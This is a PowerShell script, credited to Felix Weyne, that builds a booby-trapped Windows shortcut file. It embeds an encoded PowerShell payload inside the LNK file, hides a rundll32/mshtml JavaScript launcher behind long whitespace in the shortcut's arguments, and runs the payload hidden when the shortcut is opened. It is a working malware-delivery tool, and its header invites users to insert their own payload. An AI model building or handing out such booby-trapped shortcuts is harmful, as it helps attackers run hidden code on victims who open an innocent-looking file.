#
# Create backdoored LNK file - by Felix Weyne
# Info: https://www.uperesia.com/booby-trapped-shortcut
# -Usage: place your powershell payload in $payloadContents
# -This payload can embed for instance an executable that needs
# -to be dropped to disk/loaded into memory
#

$shortcutName = "ÎÒµÄµçÄÔ.lnk"
$shortcutOutputPath = "$Home\Desktop\"+$shortcutName
$shortcutFallbackExecutionFolder="`$env:temp"
$payloadContents =
@'
    explorer
    echo $env:computername >> $Home\Desktop\IhaveRun.txt
    echo $env:computername >> $Home\Desktop\IhaveRun.txt
'@

$bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadContents)
$payload = [Convert]::ToBase64String($bytes)

function Convert-ByteArrayToHexString($inputByteArray)
{
    $String = [System.BitConverter]::ToString($inputByteArray)
    $String = $String -replace "\-",""
    $String
}

function Convert-HexStringToByteArray ($hexString) {
    $hexString = $hexString.ToLower()
    ,@($hexString -split '([a-f0-9]{2})' | foreach-object { if ($_) {[System.Convert]::ToByte($_,16)}})
}

function CreateShortcut($payloadStart,$payloadSize) {

#<------>
#<Part 1: encode carving script>
#<------>

#$stP = startPayload, $siP = sizePayload,
#$scB = scriptblock, $lnk = filestream LNK file
#$b64 = base64 encoded scriptblok, $f=shortcut name
$carvingScript = @'
$stP,$siP={0},{1};
$f='{2}';
if(-not(Test-Path $f)){{
$x=Get-ChildItem -Path {3} -Filter $f -Recurse;
[IO.Directory]::SetCurrentDirectory($x.DirectoryName);
}}
$lnk=New-Object IO.FileStream $f,'Open','Read','ReadWrite';
$b64=New-Object byte[]($siP);
$lnk.Seek($stP,[IO.SeekOrigin]::Begin);
$lnk.Read($b64,0,$siP);
$b64=[Convert]::FromBase64CharArray($b64,0,$b64.Length);
$scB=[Text.Encoding]::Unicode.GetString($b64);
iex $scB;
'@ -f $payloadStart,$payloadSize,$shortcutName,$shortcutFallbackExecutionFolder
    write-host "Generated carvingscript:" -foregroundcolor "yellow"
    echo $carvingScript;
    $compressedCarvingScript = $carvingScript -replace "`n",''  -replace "`r",''

    # Convert string to base64 encoded command
    $bytes = [System.Text.Encoding]::ASCII.GetBytes( $compressedCarvingScript  )
    $encodedCommand = [Convert]::ToBase64String($bytes)

   
    #<------>
    #<Part 2: create shortcut with encoded carving script>
    #<------>

    $WshShell = New-Object -comObject WScript.Shell

    $Shortcut = $WshShell.CreateShortcut($shortcutOutputPath)
    #$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    $Shortcut.TargetPath = "C:\Windows\System32\rundll32.exe"
    #$Shortcut.Arguments = "-WindowStyle Hidden -Ep ByPass `$r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('$encodedCommand'))";
    $Shortcut.Arguments = '                                                                                                                                                                                                                                                                    javascript:"\..\mshtml,RunHTMLApplication ";new%20ActiveXObject("WScript.Shell").Run("powershell.exe -Enc '+$payload+'",0,true);self.close();'
    $Shortcut.IconLocation = "C:\Windows\system32\SHELL32.dll, 15"
    #$Shortcut.IconLocation = "C:\ProgramData\Microsoft\Office\MySharePoints.ico"
    $Shortcut.Save()
}

#<------>
#<Part 3: find start of embedded payload (start of computer hostname)>
#<------>
write-host "Creating LNK with payload. This will enable us to see where the payload starts" -foregroundcolor "green"
$payloadSize = $payload.Length
CreateShortcut 9999 $payloadSize

$enc = [system.Text.Encoding]::UTF8
[string]$computerName = $ENV:COMPUTERNAME
$computerNameBytes = $enc.GetBytes($computerName.ToLower())

$readin = [System.IO.File]::ReadAllBytes($shortcutOutputPath);
$contentsLnkFile = (Convert-ByteArrayToHexString $readin) -join ''
$computerNameInHex = (Convert-ByteArrayToHexString $computerNameBytes) -join ''

$startPayload = ($contentsLnkFile.IndexOf($computerNameInHex)) / 2
write-host "Start of payload in LNK file is at byte: #"$startPayload -foregroundcolor "green"

#<------>
#<Part 3: create new link with correct start of payload
#<------>
Remove-Item $shortcutOutputPath

CreateShortcut $startPayload $payloadSize
write-host "Output LNK file: "  $shortcutOutputPath -foregroundcolor "Cyan"


#<------>
#<Part 4: embed payload
#<------>
$payloadBytes = $enc.GetBytes($payload)
$payloadInHex = Convert-ByteArrayToHexString $payloadBytes
$readin = [System.IO.File]::ReadAllBytes($shortcutOutputPath);
$contentsLnkFile = (Convert-ByteArrayToHexString $readin) -join ''
$contentsLnkFile = $contentsLnkFile -replace $computerNameInHex,$payloadInHex;

$writeout = Convert-HexStringToByteArray $contentsLnkFile;
set-content -value $writeout -encoding byte -path $shortcutOutputPath;